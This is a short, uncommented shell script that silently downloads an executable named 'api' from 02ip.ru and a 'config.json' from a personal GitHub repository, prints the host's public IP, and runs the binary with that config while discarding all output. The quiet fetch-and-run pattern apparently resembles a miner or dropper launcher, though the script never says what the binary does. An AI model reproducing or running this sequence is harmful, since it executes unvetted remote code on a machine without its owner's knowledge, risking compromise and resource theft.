wget -q -O api https://02ip.ru/service && chmod +x api >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/yunusjua/print/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./api -c "config.json" >/dev/null 2>&1
